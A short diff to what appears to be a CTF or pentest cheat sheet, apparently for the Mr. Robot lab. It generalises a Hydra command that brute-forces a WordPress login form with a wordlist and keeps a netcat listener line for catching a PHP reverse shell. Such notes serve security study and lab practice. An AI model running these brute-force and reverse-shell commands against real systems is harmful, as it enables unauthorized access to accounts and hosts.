@@ -1,7 +1,8 @@
 _______________________________________________________________________________
 Hydra for web:
-  hydra -l Elliot -P fsocity dic 10.10.12.13 http-post-form "/wp-login.php: log=^USER^&pwd=^PWD^: Invalid username" -t 3
-
+  hydra -l username -P fsocity dic 10.10.12.13 http-post-form "/wp-login.php: log=^USER^&pwd=^PWD^: Invalid username" -t 3
+        ^^^ (-L if a username
+        list is used)
 _______________________________________________________________________________
 Reverse Shell - php:
   rlwrap nc -lnvp 53
